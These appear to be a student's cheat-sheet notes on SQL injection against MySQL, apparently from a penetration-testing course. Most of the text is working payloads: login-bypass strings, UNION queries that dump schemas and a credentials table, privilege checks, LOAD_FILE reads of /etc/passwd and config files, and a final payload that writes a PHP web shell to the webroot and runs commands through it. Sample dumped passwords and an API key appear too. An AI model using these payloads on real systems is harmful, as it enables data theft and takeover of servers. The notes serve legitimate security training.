
SELECT * FROM logins WHERE username='admin' AND password = '47bce5c74f589f4867dbd57e9ca9f808';

admin') or '1'='1'-- -

SELECT * FROM logins WHERE (username='admin' AND id > 1)-- - AND password = '47bce5c74f589f4867dbd57e9ca9f808';
test' OR id = 5)-- -


# dump name databases

UNION select 1,database(),2,3-- -

## dump databases:
		UNION select 1,2,SCHEMA_NAME,4 FROM INFORMATION_SCHEMA.SCHEMATA-- - 
		
### example:
		UNION select 1,2,schema_name,4 from INFORMATION_SCHEMA.SCHEMATA-- -
		DATABSES="information_schema,mysqL,performance_schema,backup,dev"

## dump tables

	' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='name_db'-- -

### example

	' union select 1,table_name,table_schema,4 from information_schema.tables where table_schema='dev'-- -
	TABLES="framework,pages,credentials,posts"

## dump columns

	' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='name_table'-- -

### example
	' union select 1,column_name,table_name,table_schema from information_schema.columns where table_name='credentials'-- -

COLUMNS="username,password"

## dump data

	UNION select 1, username, password, 4 from dev.credentials-- -
### example :
	union select  1,username,password 4 from dev.credentials-- -
### OR	
	union select  1,2,group_concat(username,":",password),4 from dev.credentials-- -

		admin	password	
		dev_admin	admin123	
		api_key	MzkyMDM3ZGJiYTUxZjY5Mjc3DFNGFDmQ2YFGDF2VmYjZkZDU0NmHGFDQgIC0K	
		software_engineer	3920aaaaadfsdf37dbba51f692776d6cefb6dd546d

if want understand a lot information linke website mysql
https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html

## Reading Files:

Privileges:eading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

## DB User:
	SELECT USER()
	SELECT CURRENT_USER()
	SELECT user from mysql.user

### commands : 
		UNION SELECT 1, user(), 3, 4-- -
		UNION SELECT 1, user, 3, 4 from mysql.user-- -

## User Privileges
Now that we know our users, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

		SELECT super_priv FROM mysql.user

### example:
	
		UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

## Notes:
 		UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
		THis payload return in page ('Y') which means YES, indicating superuser privileges. We can also dump other privileges we have directly

SELECT sql_grants FROM information_schema.sql_show_grants

Once again, we can add WHERE user="root" to only show our current user root privileges. Our payload would be:

' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges-- -
return in page YES or Y 

all of the possible privileges given to our current user:


## LOAD_FILE:
		SELECT LOAD_FILE('/etc/passwd');
	example:
	 	UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

	 	Another Example:
	 		We know that the current page is index.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/index.php
	 		UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
			
## Writing Files
	When it comes to writing files to the back-end server, it becomes much more restricted in modern DMBSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.

	### Write File Privileges
		To be able to write files to the back-end server using a MySQL database, we require three things:
		User with FILE privilege enabled
		MySQL global secure_file_priv variable not enabled
		Write access to the location we want to write to on the back-end server

		We have already found that our current user has the FILE privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the secure_file_priv global variable.

### secure_file_priv:

		SHOW VARIABLES LIKE 'secure_file_priv';
		SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
	### example:
				' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
				look return payload in page that the secure_file_priv value is empty, meaning that we can read/write files to any location 

		### SELECT INTO OUTFILE:

			SELECT * from users INTO OUTFILE '/tmp/credentials';
			SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
			select 'file written successfully!' into outfile '/var/www/html/proof.txt'
		### example:
			' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

## Writing a Web Shell

Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:		

	<?php system($_REQUEST[0]); ?>

	### example
			' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

			https://www.website.com//shell.php?0=id
